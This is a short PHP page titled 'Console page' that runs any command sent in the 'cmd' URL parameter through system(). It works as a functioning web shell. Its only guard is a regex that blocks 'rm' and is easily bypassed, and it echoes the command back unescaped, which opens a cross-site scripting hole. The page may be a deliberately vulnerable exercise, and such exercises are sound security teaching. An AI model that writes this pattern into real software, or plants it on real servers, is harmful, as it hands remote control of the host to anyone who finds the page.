<<html lang="en">
<head>
    <title>Console page</title>
    <link rel="stylesheet" href="style.css" type="text/css"/>
</head>
<body>
<?php
echo '<form><input name="cmd" /></form>';
if(isset($_GET['cmd'])){
    $command = $_GET['cmd'];
    if (!preg_match('/\s*rm\s+/', $command)){
        echo 'Command: ' . $command . '<br>';
        system($command);
    } else {
        system('echo "Выполнение команды запрещено"');
    }
}
?>
</body>
</html>
